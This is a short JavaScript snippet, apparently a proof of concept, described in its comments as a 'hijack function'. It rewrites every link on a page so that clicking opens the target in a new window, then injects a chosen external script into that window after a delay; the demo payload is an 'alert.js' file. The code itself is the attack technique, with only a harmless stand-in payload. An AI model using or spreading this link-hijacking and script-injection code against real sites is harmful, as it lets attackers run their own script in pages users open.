
function script2obj(window_obj,src){
	alert(window.name);
	s=window_obj.document.createElement('script');
	s.src=src;
	window_obj.document.getElementsByTagName('body')[0].appendChild(s);
}
/*hijack function
parameters:
js:inject js*/
function hijack_links(js){
  for(i=0;i<document.links.length;i++)
  {
  	  document.links[i].onclick=function(){
  		x=window.open(this.href);//get the object which open the new window
  		window.name="sfd";
  		alert(x);
  		setTimeout("script2obj(x,'"+js+"')",2000); 
  		//delay 2 sec for waitting for the dom download complete,and then inject the js.
  	  return false;
  	}
  }
}
hijack_links('alert.js');